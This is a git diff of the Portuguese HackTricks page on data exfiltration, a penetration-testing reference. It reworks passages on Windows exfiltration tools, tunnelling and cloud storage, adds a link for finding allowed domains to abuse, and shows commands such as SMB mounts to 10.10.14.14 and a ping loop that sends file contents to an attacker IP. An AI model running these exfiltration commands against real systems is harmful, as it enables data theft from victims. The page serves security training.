@@ -1,11 +1,11 @@
-## Exfiltração
+# Exfiltração
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
@@ -17,7 +17,11 @@
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
-## Copiar e Colar Base64
+## Domínios comumente permitidos para exfiltrar informações
+
+Verifique [https://lots-project.com/](https://lots-project.com/) para encontrar domínios comumente permitidos que podem ser abusados
+
+## Copiar e colar Base64
 
 **Linux**
 ```bash
@@ -225,21 +229,21 @@ A exfiltração de dados em sistemas Windows pode ser realizada de várias manei
 
 As ferramentas de linha de comando do Windows, como `bitsadmin`, `certutil`, `powershell`, `netsh`, `reg`, `wevtutil`, `wmic`, entre outras, podem ser usadas para exfiltrar dados. Essas ferramentas podem ser usadas para codificar, compactar e enviar dados para um servidor remoto.
 
-## 2. Uso de aplicativos de terceiros
+## 2. Uso de ferramentas de terceiros
 
-Os aplicativos de terceiros, como o `Cobalt Strike`, `Metasploit`, `PowerSploit`, `Empire`, `Pupy`, entre outros, podem ser usados para exfiltrar dados. Esses aplicativos geralmente têm recursos avançados de exfiltração, como a capacidade de exfiltrar dados por meio de protocolos de rede específicos ou por meio de canais ocultos.
+Existem várias ferramentas de terceiros que podem ser usadas para exfiltrar dados em sistemas Windows, como `QuasarRAT`, `Meterpreter`, `Pupy`, `Empire`, `Cobalt Strike`, entre outras. Essas ferramentas geralmente fornecem recursos avançados de exfiltração, como criptografia, compactação e ofuscação de dados.
 
-## 3. Uso de malware personalizado
+## 3. Uso de técnicas de tunelamento
 
-O malware personalizado pode ser criado para exfiltrar dados de um sistema Windows. O malware pode ser projetado para se comunicar com um servidor remoto e enviar dados exfiltrados por meio de protocolos de rede específicos ou por meio de canais ocultos.
+As técnicas de tunelamento, como `HTTP Tunneling`, `DNS Tunneling`, `ICMP Tunneling`, `TCP Tunneling`, `SMB Tunneling`, entre outras, podem ser usadas para exfiltrar dados em sistemas Windows. Essas técnicas permitem que os dados sejam encapsulados em protocolos de rede legítimos e enviados para um servidor remoto.
 
-## 4. Uso de técnicas de engenharia social
+## 4. Uso de serviços de armazenamento em nuvem
 
-As técnicas de engenharia social podem ser usadas para exfiltrar dados de um sistema Windows. Por exemplo, um invasor pode usar um e-mail de phishing para enviar dados exfiltrados para um endereço de e-mail controlado pelo invasor.
+Os serviços de armazenamento em nuvem, como `Dropbox`, `Google Drive`, `OneDrive`, `Box`, entre outros, podem ser usados para exfiltrar dados em sistemas Windows. Esses serviços permitem que os dados sejam armazenados em um servidor remoto e acessados por meio de um aplicativo ou navegador da web.
 
 ## 5. Uso de dispositivos de armazenamento externos
 
-Os dispositivos de armazenamento externos, como unidades USB, discos rígidos externos e cartões SD, podem ser usados para exfiltrar dados de um sistema Windows. Esses dispositivos podem ser conectados ao sistema e os dados podem ser copiados para o dispositivo de armazenamento externo.
+Os dispositivos de armazenamento externos, como `USB`, `CD`, `DVD`, `HD externo`, entre outros, podem ser usados para exfiltrar dados em sistemas Windows. Esses dispositivos permitem que os dados sejam armazenados fisicamente e transportados para outro local.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -308,7 +312,11 @@ cat <&6 > file.txt
 ```
 ## **ICMP**
 
-(ICMP) é um protocolo de camada de rede usado para enviar mensagens de erro e informações operacionais sobre problemas de rede. O ICMP é frequentemente usado em conjunto com outros protocolos de rede, como o IP, para fornecer informações sobre o status da rede. O ICMP é usado por muitas ferramentas de teste de penetração para exfiltrar dados de uma rede.
+O Protocolo de Mensagem de Controle da Internet (ICMP) é um protocolo de camada de rede usado para enviar mensagens de erro e informações operacionais sobre problemas de rede. O ICMP é frequentemente usado em conjunto com outras ferramentas de rede para testar a conectividade da rede e diagnosticar problemas de rede.
+
+O ICMP pode ser usado para exfiltrar dados de uma rede, enviando pacotes ICMP com dados ocultos no campo de carga útil. Isso é conhecido como "túnel ICMP". O tráfego ICMP é frequentemente permitido em firewalls e outras soluções de segurança, tornando o túnel ICMP uma técnica de exfiltração atraente.
+
+Existem várias ferramentas disponíveis para criar túneis ICMP, incluindo ICMPTunnel e PingTunnel. Essas ferramentas permitem que um invasor crie um túnel ICMP entre um sistema comprometido e um servidor controlado pelo invasor, permitindo que os dados sejam exfiltrados da rede comprometida.
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -416,8 +424,8 @@ Agora basta copiar e colar o texto em nosso shell do Windows. E ele criará auto
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
-**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100.000**!
+<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
+**Dica de bug bounty**: **inscreva-se** na **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100.000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
